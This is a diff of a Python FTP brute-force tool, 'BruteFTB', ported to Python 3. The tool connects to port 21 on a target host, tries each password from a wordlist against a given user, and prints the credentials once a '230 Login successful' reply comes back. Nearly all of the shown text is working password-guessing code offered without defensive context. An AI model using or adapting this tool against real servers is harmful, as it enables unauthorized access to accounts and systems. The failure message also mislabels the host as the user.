@@ -1,6 +1,8 @@
+#!/usr/bin/env python3
 import os
 import socket
 import argparse
+import threading
 from sys import exit
 
 def banner():
@@ -45,6 +47,7 @@ help_message = '''
 
 '''
 
+
 class BruteFTB(object):
     def __init__(self, host, user, wordlist):
         self.user = user
@@ -57,18 +60,18 @@ class BruteFTB(object):
             read = wordlist.readlines()
         
             for line in read:
-                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
                 sc.connect((self.host, 21))
                 sc.recv(1024)
 
-                sc.send("USER {0}\r\n".format(self.user))
+                sc.send("USER {0}\r\n".format(self.user).encode())
                 sc.recv(1024)
-                sc.send("PASS {0}\r\n".format(line.strip()))
+                sc.send("PASS {0}\r\n".format(line.strip()).encode())
                 
                 r = sc.recv(1024)
-                sc.send("QUIT\r\n")
+                sc.send("QUIT\r\n".encode())
 
-                if "230 Login successful" in r:
+                if u"230 Login successful" in str(r):
                     print("\n\n")
                     print("----------Successful----------")
                     print("Target: {0}".format(self.host))
@@ -76,8 +79,8 @@ class BruteFTB(object):
                     print("Password: {0}".format(line.strip()))
                     print("------------------------------")
                     exit(0)
-            
-                print("User: {0} Password: {1} - FAILED".format(self.host, line.strip()))
+                else:            
+                    print("User: {0} Password: {1} - failed".format(self.host, line.strip()))
 
 def main():
 
